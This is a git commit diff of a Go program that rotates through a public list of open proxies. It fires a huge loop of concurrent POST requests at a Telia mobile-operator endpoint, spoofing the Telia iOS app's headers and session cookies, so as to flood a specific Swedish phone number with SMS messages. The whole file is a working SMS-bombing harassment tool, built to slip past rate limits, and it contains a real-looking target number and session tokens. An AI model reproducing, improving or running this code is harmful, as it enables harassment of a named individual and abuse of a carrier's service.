c38baeb9d1de158b1fc23331173899d10e86d769
0x1b6f8942ed3c0a7d5f89e2640c7a2b <142523482+0x1b6f8942ed3c0a7d5f89e2640c7a2b@users.noreply.github.com>
2023-10-26 12:46:41 +0200

    Update main.go

--- main.go
+++ main.go
@@ -1,81 +1,93 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
-	"math/rand" // Import the "math/rand" package
+	"io/ioutil"
+	"log"
+	"math/rand"
 	"net/http"
+	"strings"
 	"time"
 
 	"github.com/valyala/fasthttp"
+	"github.com/valyala/fasthttp/fasthttpproxy"
 )
 
-var proxyList []string
+var proxyList = fetchProxies("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
 
 func main() {
-	// Fetch proxy list from an API
-	proxyList = fetchProxyList()
+
+	// Ensure there are proxies available
 	if len(proxyList) == 0 {
 		fmt.Println("No proxies available.")
 		return
 	}
 
+	// Start flooding requests
 	for i := 0; i < 46706505038; i++ {
-		go flooder()
+		go floodSMS()
 		time.Sleep(time.Millisecond * 1)
 	}
 }
-
-func fetchProxyList() []string {
-	// Replace this with your proxy API endpoint
-	proxyAPIURL := "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
-
-	resp, err := http.Get(proxyAPIURL)
+func fetchProxies(uri string) []string {
+	resp, err := http.Get(uri)
 	if err != nil {
-		fmt.Printf("Error fetching proxy list: %s\n", err)
-		return []string{}
+		log.Fatal(err)
 	}
 	defer resp.Body.Close()
-
-	var proxies []string
-	scanner := bufio.NewScanner(resp.Body)
-	for scanner.Scan() {
-		proxies = append(proxies, scanner.Text())
+	//read the body of the response
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatal(err)
 	}
 
-	if err := scanner.Err(); err != nil {
-		fmt.Printf("Error reading proxy list: %s\n", err)
-	}
-
-	return proxies
+	proxy_list := strings.Replace(string(body), "\r", "", -1)
+	return strings.Split(proxy_list, "\n")
 }
 
-func flooder() {
-	url :=  "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
-	
+// Function to check the status of a website through a proxy
 
-	// Randomly select a proxy from the proxy list
+// Function to flood SMS requests using proxies
+func floodSMS() {
+	url := "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
 	proxy := proxyList[rand.Intn(len(proxyList))]
-	data := `{"identifiter:"46706505038"}`
+
+	data := `{"identifier": "46706505038"}` // Fixed the JSON formatting issue
 
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
 
 	defer fasthttp.ReleaseRequest(req)
 	defer fasthttp.ReleaseResponse(resp)
-
 	req.Header.SetMethod("POST")
-	req.Header.Set("Origin", "https://www.ul.se")
+	req.Header.Set("Host", "sa.telia.se")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("is-DarkMode", "true")
+	req.Header.Set("X-IOS-Build", "4513")
+	req.Header.Set("ga-av", "2023.13")
+	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
+	req.Header.Set("Accept-Language", "sv")
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Content-Length", "34")
+	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("ga-an", "Mitttelia")
+	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
+	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
 	req.SetRequestURI(url)
 	req.SetBodyString(data)
 
-	if err := fasthttp.Do(req, resp); err != nil {
-		fmt.Printf("Error: %s\n", err)
-		return
+	client := &fasthttp.Client{
+		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
 	}
 
-	// Print the response status code and body
-	fmt.Println("[+] Sent a message to", phun, proxy, "has connected")
-	fmt.Println("[+]", proxy, "has connected")
+	if err := client.Do(req, resp); err != nil {
+		fmt.Println("[-] Failed to send message, invalid proxy")
+		return
+	} else {
+		fmt.Printf("[+] Sent a message to 0706505038 with proxy %s\n", proxy)
+
+	}
+
+	fmt.Println(string(resp.Body()))
 }
